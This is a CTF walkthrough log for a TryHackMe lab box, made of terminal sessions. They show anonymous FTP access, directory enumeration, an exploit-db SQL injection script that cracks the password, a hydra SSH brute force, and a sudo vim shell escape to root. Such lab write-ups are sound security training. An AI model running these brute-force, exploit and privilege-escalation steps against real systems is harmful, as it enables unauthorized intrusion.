@@ -1,0 +1,167 @@
+
+┌──(kali㉿kali)-[~/github/tryhackme/easyctf/enumeration]
+└─$ lftp anonymous@10.10.82.195                                                           
+Password: 
+lftp anonymous@10.10.82.195:~> set ftp:passive-mode off
+lftp anonymous@10.10.82.195:~> ls
+drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
+lftp anonymous@10.10.82.195:/> cd pub
+lftp anonymous@10.10.82.195:/pub> ls
+-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
+lftp anonymous@10.10.82.195:/pub> get ForMitch.txt 
+166 bytes transferred                                 
+lftp anonymous@10.10.82.195:/pub> exit
+
+
+============================================================================
+
+TRYHACKME WAY
+
+============================================================================
+
+└─$ gobuster dir -u http://10.10.82.195 -w /usr/share/wordlists/dirb/common.txt -t 50 -o gobuster_dirb.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.82.195
+[+] Method:                  GET
+[+] Threads:                 50
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.htaccess            (Status: 403) [Size: 296]
+/.htpasswd            (Status: 403) [Size: 296]
+/.hta                 (Status: 403) [Size: 291]
+/index.html           (Status: 200) [Size: 11321]
+/robots.txt           (Status: 200) [Size: 929]
+/server-status        (Status: 403) [Size: 300]
+/simple               (Status: 301) [Size: 313] [--> http://10.10.82.195/simple/]
+Progress: 4614 / 4615 (99.98%)
+===============================================================
+Finished
+===============================================================
+
+
+
+https://www.exploit-db.com/exploits/46635
+
+
+python2 ../exploits/46635.py -u http://10.10.82.195/simple -c -w /usr/share/seclists/Passwords/Common-Credentials/best110.txt
+
+
+
+[+] Salt for password found: 1dac0d92e9fa6bb2
+[+] Username found: mitch
+[+] Email found: admin@admin.com
+[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
+[+] Password cracked: secret
+
+
+
+============================================================================
+
+SECOND METHOD - FASTEST
+
+============================================================================
+
+
+┌──(kali㉿kali)-[~/github/tryhackme/easyctf/enumeration]
+└─$ cat ../files/ForMitch.txt
+Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
+ 
+
+
+ 
+ └─$ hydra -l mitch -P /usr/share/wordlists/rockyou.txt ssh://10.10.82.195:2222 -t 4 -v -o hydra_ssh.txt
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-13 23:26:21
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
+[DATA] attacking ssh://10.10.82.195:2222/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[INFO] Testing if password authentication is supported by ssh://mitch@10.10.82.195:2222
+[INFO] Successful, password authentication is supported by ssh://10.10.82.195:2222
+[2222][ssh] host: 10.10.82.195   login: mitch   password: secret
+[STATUS] attack finished for 10.10.82.195 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-13 23:26:51
+
+
+login: mitch   
+password: secret
+
+
+
+$ whoami
+mitch
+$ ls -al
+total 36
+drwxr-x--- 3 mitch mitch 4096 aug 19  2019 .
+drwxr-xr-x 4 root  root  4096 aug 17  2019 ..
+-rw------- 1 mitch mitch  178 aug 17  2019 .bash_history
+-rw-r--r-- 1 mitch mitch  220 sep  1  2015 .bash_logout
+-rw-r--r-- 1 mitch mitch 3771 sep  1  2015 .bashrc
+drwx------ 2 mitch mitch 4096 aug 19  2019 .cache
+-rw-r--r-- 1 mitch mitch  655 mai 16  2017 .profile
+-rw-rw-r-- 1 mitch mitch   19 aug 17  2019 user.txt
+-rw------- 1 mitch mitch  515 aug 17  2019 .viminfo
+$ cat user.txt
+G00d j0b, keep up!
+
+
+$ find / -perm -4000 -type f 2>/dev/null
+/bin/su
+/bin/ping
+/bin/mount
+/bin/umount
+/bin/ping6
+/bin/fusermount
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/xorg/Xorg.wrap
+/usr/lib/snapd/snap-confine
+/usr/lib/i386-linux-gnu/oxide-qt/chrome-sandbox
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/sbin/pppd
+$ 
+
+$ sudo -l
+User mitch may run the following commands on Machine:
+    (root) NOPASSWD: /usr/bin/vim
+
+
+$ sudo vim -c ':!/bin/sh'
+
+# whoami
+root
+# 
+# cd /root
+# ls -al
+total 28
+drwx------  4 root root 4096 aug 17  2019 .
+drwxr-xr-x 23 root root 4096 aug 19  2019 ..
+-rw-r--r--  1 root root 3106 oct 22  2015 .bashrc
+drwx------  2 root root 4096 aug 17  2019 .cache
+drwxr-xr-x  2 root root 4096 aug 17  2019 .nano
+-rw-r--r--  1 root root  148 aug 17  2015 .profile
+-rw-r--r--  1 root root   24 aug 17  2019 root.txt
+# cat roo.txt 
+cat: roo.txt: No such file or directory
+# cat root.txt
+W3ll d0n3. You made it!
+# 
+
+
